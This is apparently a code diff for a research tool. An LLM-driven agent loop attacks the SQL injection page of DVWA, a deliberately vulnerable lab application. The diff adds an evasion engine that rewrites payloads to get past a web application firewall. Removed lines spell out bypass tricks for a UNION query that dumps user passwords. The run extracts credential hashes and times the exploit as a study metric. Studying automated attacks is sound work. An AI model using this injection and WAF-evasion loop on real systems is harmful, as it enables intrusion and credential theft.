@@ -1,9 +1,14 @@
 """Orchestrator: the control loop that mirrors PentAGI's coordinator.
 
-It logs in, sets the DVWA level, asks the Planner for a strategy, then repeatedly lets the
-Executor craft a payload, sends it through the DVWA tool, and lets the Analyst judge the
-response — re-planning when the Analyst says so. It bounds the run by steps and wall-clock
-time, and records the time-to-exploit used as the study's metric."""
+It logs in, sets the DVWA level, asks the Planner for a strategy and CLEAN base payloads, then
+drives two decoupled layers:
+  * CONTENT (the SQL itself) comes from the Planner/Executor (the LLM).
+  * SURFACE (how the payload looks on the wire) comes from the deterministic EvasionEngine.
+
+On a WAF block the engine escalates the surface form of the SAME base (comments, case, encoding…)
+without bothering the model; only when the surface passes the WAF but the SQL is wrong does it ask
+the Executor/Planner for different content. It bounds the run by steps and wall-clock time and
+records the time-to-exploit used as the study's metric, plus the WAF profile it learned."""
 from __future__ import annotations
 
 import re
@@ -12,10 +17,13 @@ from typing import Any, Callable, Optional
 
 from .agents import Analyst, Executor, Planner
 from .dvwa import DVWAClient
+from .evasion import EvasionEngine
 from .llm import OllamaClient
 from .types import Attempt, RunResult
 
 Logger = Optional[Callable[[str], None]]
+
+MAX_REPLANS = 6  # cap LLM re-plans so an unhelpful model cannot loop forever
 
 
 def _candidate_payload(candidate: Any) -> str:
@@ -36,6 +44,14 @@ def _credential_rows(rows: list[dict[str, str]]) -> list[dict[str, str]]:
         if _HASH_RE.match(surname):
             creds.append({"username": row.get("first_name", ""), "hash": surname})
     return creds
+
+
+def _history(attempts: list[Attempt]) -> str:
+    return "; ".join(
+        f"#{a.step} {a.payload!r}->"
+        + ("WAF-BLOCKED" if a.response.blocked else a.analysis.get("assessment", ""))
+        for a in attempts[-4:]
+    )
 
 
 class Orchestrator:
@@ -60,39 +76,68 @@ class Orchestrator:
         self.dvwa.set_security(level)
         say(f"[Orchestrator] logged in, security level set to '{level}'")
 
+        engine = EvasionEngine()
         plan = self.planner.plan(level)
         strategy = str(plan.get("strategy", ""))
-        candidates: list[Any] = plan.get("payloads") or []
+        bases_queue: list[str] = [p for p in (_candidate_payload(c) for c in plan.get("payloads") or []) if p]
         say(f"[Planner] strategy: {strategy}")
 
         attempts: list[Attempt] = []
         extracted: list[dict[str, str]] = []
         success = False
-        hint = ""
-        idx = 0
+        last_hint = ""
+        replans = 0
         step = 0
 
-        while step < max_steps and (time.monotonic() - start) < timeout_seconds:
+        def next_base() -> Optional[str]:
+            """Finalise the next base payload (content), re-planning when the queue drains."""
+            nonlocal bases_queue, strategy, replans
+            while True:
+                if bases_queue:
+                    candidate = bases_queue.pop(0)
+                    crafted = self.executor.craft(level, strategy, candidate, _history(attempts), last_hint)
+                    base = str(crafted.get("payload") or candidate).strip()
+                    if base:
+                        return base
+                    continue
+                if replans >= MAX_REPLANS:
+                    return None
+                replans += 1
+                feedback = last_hint or (
+                    "all attempted payloads were blocked or ineffective even after WAF evasion; "
+                    "try a DIFFERENT base technique (error-based, boolean-blind, different columns)"
+                )
+                p = self.planner.plan(level, feedback=feedback)
+                strategy = str(p.get("strategy", strategy))
+                bases_queue = [q for q in (_candidate_payload(c) for c in p.get("payloads") or []) if q]
+                say(f"[Planner] replan {replans}: {strategy}")
+                if not bases_queue:
+                    return None
+
+        current_base = next_base()
+        while current_base is not None and step < max_steps and (time.monotonic() - start) < timeout_seconds:
+            payload, pipeline = engine.next_payload(current_base)
+            if payload is None:  # every surface form of this base was already tried
+                current_base = next_base()
+                continue
+
             step += 1
-            candidate = candidates[idx] if idx < len(candidates) else ""
-            history = "; ".join(
-                f"#{a.step} {a.payload!r}->"
-                + ("WAF-BLOCKED" if a.response.blocked else a.analysis.get("assessment", ""))
-                for a in attempts[-4:]
-            )
-
-            crafted = self.executor.craft(level, strategy, candidate, history, hint)
-            payload = str(crafted.get("payload") or _candidate_payload(candidate)).strip()
-            if not payload:
-                say("[Executor] no payload produced — stopping")
-                break
-            say(f"[Executor] step {step}: {payload!r}")
-
+            surface = list(pipeline) or ["plain"]
+            say(f"[Executor] step {step}: {payload!r}  [surface={surface}]")
             response = self.dvwa.run_sqli(payload, level)
+
             if response.blocked:
-                say(f"[WAF] blocked (HTTP {response.http_status}) — payload rejected, must evade")
+                say(f"[WAF] blocked (HTTP {response.http_status}) — escalating evasion")
+                engine.record(pipeline, payload, blocked=True)
+                attempts.append(
+                    Attempt(step, payload, f"surface={surface}", response,
+                            {"assessment": "WAF blocked", "next_action": "evade", "blocked": True})
+                )
+                continue  # same base, next (more aggressive) surface form
+
+            engine.record(pipeline, payload, blocked=False)  # this surface passes the WAF
             analysis = self.analyst.analyze(level, payload, response)
-            attempts.append(Attempt(step, payload, str(crafted.get("reason", "")), response, analysis))
+            attempts.append(Attempt(step, payload, f"surface={surface}", response, analysis))
             say(f"[Analyst] {analysis.get('assessment', '')} -> {analysis.get('next_action', '')}")
 
             creds = _credential_rows(response.rows)
@@ -105,24 +150,8 @@ class Orchestrator:
                 say(f"[Orchestrator] SUCCESS at step {step}")
                 break
 
-            hint = str(analysis.get("hint", ""))
-            next_action = analysis.get("next_action")
-            if response.blocked:
-                # A WAF block is never a dead end for the strategy — it means the signature was
-                # caught, so force a re-plan with evasion regardless of the analyst's verdict.
-                next_action = "replan"
-                hint = hint or (
-                    "WAF blocked the payload (HTTP 403). Keep the same 2-column UNION that dumps "
-                    "user,password but obfuscate it: inline comments /**/ between keywords, mixed "
-                    "case (uNiOn SeLeCt), UNION ALL, versioned comments /*!50000...*/, or # instead of -- -."
-                )
-            if next_action == "replan":
-                plan = self.planner.plan(level, feedback=hint or "previous payloads failed")
-                strategy = str(plan.get("strategy", strategy))
-                candidates = plan.get("payloads") or candidates
-                idx = 0
-            else:
-                idx += 1
+            last_hint = str(analysis.get("hint", ""))
+            current_base = next_base()  # surface ok, content wrong -> new base (keeps locked pipeline)
 
         elapsed = time.monotonic() - start
         return RunResult(
@@ -133,4 +162,5 @@ class Orchestrator:
             extracted=extracted,
             strategy=strategy,
             attempts=attempts,
+            waf_profile=engine.profile.summary(),
         )
